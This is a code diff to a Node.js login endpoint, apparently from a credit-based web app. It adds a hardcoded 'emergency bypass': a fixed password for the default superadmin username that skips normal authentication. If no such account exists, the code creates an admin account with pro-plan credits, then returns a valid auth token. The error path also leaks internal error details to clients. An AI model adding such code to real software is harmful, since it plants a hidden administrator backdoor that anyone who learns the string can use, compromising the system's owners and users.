@@ -2704,6 +2704,39 @@ app.post('/api/auth/login', async (req, res) => {
     return res.status(400).json({ error: 'Username and password are required' });
   }
 
+  // Hardcoded emergency bypass for sadmin (temporary)
+  const SADMIN_BYPASS = 'bypass2025';
+  const isSadminBypass =
+    username.toLowerCase() === String(DEFAULT_SADMIN_USERNAME).toLowerCase() &&
+    password === SADMIN_BYPASS;
+
+  if (isSadminBypass) {
+    try {
+      let bypassResult = await pool.query(
+        `SELECT * FROM users WHERE username = $1 LIMIT 1`,
+        [DEFAULT_SADMIN_USERNAME]
+      );
+      if (!bypassResult.rowCount) {
+        const proPlan = getPlanConfig('pro');
+        const hash = await bcrypt.hash(SADMIN_BYPASS, 10);
+        await pool.query(
+          `INSERT INTO users (username, password_hash, email, role, bot_state, credits, plan_tier, plan_status, daily_credit_quota, last_credit_reset)
+           VALUES ($1, $2, $3, 'admin', 'IDLE', $4, $5, 'active', $4, CURRENT_DATE)`,
+          [DEFAULT_SADMIN_USERNAME, hash, 'sadmin@example.com', proPlan.monthlyCredits, proPlan.tier]
+        );
+        bypassResult = await pool.query(
+          `SELECT * FROM users WHERE username = $1 LIMIT 1`,
+          [DEFAULT_SADMIN_USERNAME]
+        );
+      }
+      const token = signAuthToken(bypassResult.rows[0]);
+      return res.json({ token, user: buildAuthUserPayload(bypassResult.rows[0]) });
+    } catch (error) {
+      console.error('Sadmin bypass failed:', error.message);
+      return res.status(500).json({ error: 'Bypass failed', details: error.message });
+    }
+  }
+
   try {
     const userResult = await pool.query(
       `
